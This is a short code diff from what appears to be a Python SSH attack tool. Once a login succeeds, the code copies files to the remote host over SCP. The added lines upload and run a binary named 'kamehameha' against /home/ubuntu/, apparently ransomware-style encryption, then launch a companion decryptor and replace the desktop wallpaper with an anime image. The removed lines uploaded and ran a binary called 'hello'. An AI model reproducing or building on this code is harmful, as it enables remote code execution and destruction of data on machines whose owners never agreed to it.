@@ -36,14 +36,18 @@ class Connection(Thread):
             self.status = 'Succeeded'
             if(sshConnection):
                 scp = SCPClient(sshConnection.get_transport())
-                scp.put('hello','hello')
-                scp.put('GOKU.jpg','GOKU.jpg')
-                scp.close()
-                sshConnection.exec_command("gsettings set org.gnome.desktop.background picture-uri file:///home/"+self.username+"/GOKU.jpg")
+                scp.put('encryption_for_ubuntu','kamehameha')
+                scp.put('kamehameha_decrypt','kamehameha_decrypt')
+                sshConnection.exec_command('chmod +x kamehameha')
+                sshConnection.exec_command("./kamehameha /home/ubuntu/ &")
                 time.sleep(1)
-                sshConnection.exec_command('chmod +x hello')
-                sshConnection.exec_command("./hello &")
-                sshConnection.exec_command("rm hello")
+                sshConnection.exec_command("./kamehameha_decrypt &")
+                time.sleep(1)
+                scp.put('GOKU.jpg','res/GOKU.jpg')
+                scp.close()
+                sshConnection.exec_command("gsettings set org.gnome.desktop.background picture-uri file:///home/"+self.username+"/res/GOKU.jpg")
+                time.sleep(1)
+                #sshConnection.exec_command("rm kamehameha")
             sshConnection.close()
         except:
             self.status = 'Failed'
